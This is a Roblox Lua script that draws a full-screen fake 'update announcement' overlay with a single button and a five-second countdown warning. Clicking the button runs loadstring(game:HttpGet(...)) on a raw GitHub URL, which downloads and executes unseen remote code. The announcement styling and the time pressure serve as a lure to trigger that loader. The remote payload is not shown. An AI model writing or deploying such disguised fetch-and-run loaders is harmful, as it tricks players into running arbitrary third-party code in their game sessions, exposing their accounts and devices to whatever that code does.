local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(0, 19282000, 0, 19282000)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(3.33471617e-05, 0, 7.62369064e-06, 0)
TextLabel.Size = UDim2.new(0, 361, 0, 52)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "announcement:"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(2.80053937e-05, 0, 1.03205066e-05, 0)
TextLabel_2.Size = UDim2.new(0, 567, 0, 61)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "updated to 1.0.2 ✅"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(2.82128403e-05, 0, 1.34840784e-05, 0)
TextLabel_3.Size = UDim2.new(0, 567, 0, 61)
TextLabel_3.Font = Enum.Font.Cartoon
TextLabel_3.Text = "mobile support ✅"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14
TextLabel_3.TextWrapped = true

TextLabel_4.Parent = Frame
TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_4.BackgroundTransparency = 1
TextLabel_4.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(2.82128403e-05, 0, 1.66476511e-05, 0)
TextLabel_4.Size = UDim2.new(0, 567, 0, 61)
TextLabel_4.Font = Enum.Font.Cartoon
TextLabel_4.Text = "tablet support ✅"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14
TextLabel_4.TextWrapped = true

TextLabel_5.Parent = Frame
TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_5.BackgroundTransparency = 1
TextLabel_5.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(2.86795967e-05, 0, 1.97593636e-05, 0)
TextLabel_5.Size = UDim2.new(0, 567, 0, 61)
TextLabel_5.Font = Enum.Font.Cartoon
TextLabel_5.Text = "her support ✅💋"
TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14
TextLabel_5.TextWrapped = true

ImageButton.Parent = Frame
ImageButton.BackgroundColor3 = Color3.new(1, 1, 1)
ImageButton.BorderColor3 = Color3.new(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(3.25692345e-05, 0, 2.58790587e-05, 0)
ImageButton.Size = UDim2.new(0, 390, 0, 108)
ImageButton.Image = "rbxassetid://132564200621044"
ImageButton.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/erchobrg/s2/main/.lua'),true))()
end)

UICorner.Parent = ImageButton
UICorner.CornerRadius = UDim.new(0, 20)

TextLabel_6.Parent = Frame
TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_6.BackgroundTransparency = 1
TextLabel_6.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(3.80665952e-05, 0, 2.94056663e-05, 0)
TextLabel_6.Size = UDim2.new(0, 283, 0, 39)
TextLabel_6.Font = Enum.Font.Cartoon
TextLabel_6.Text = "(you only have 5 seconds to press this button)"
TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14
TextLabel_6.TextWrapped = true

-- Scripts

local function HHPEZ_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local frame = script.Parent:WaitForChild("Frame")
	
	local function makeFrameDisappear()
		wait(5) 
		frame.Visible = false  
	end
	
	makeFrameDisappear()
end
coroutine.wrap(HHPEZ_fake_script)()
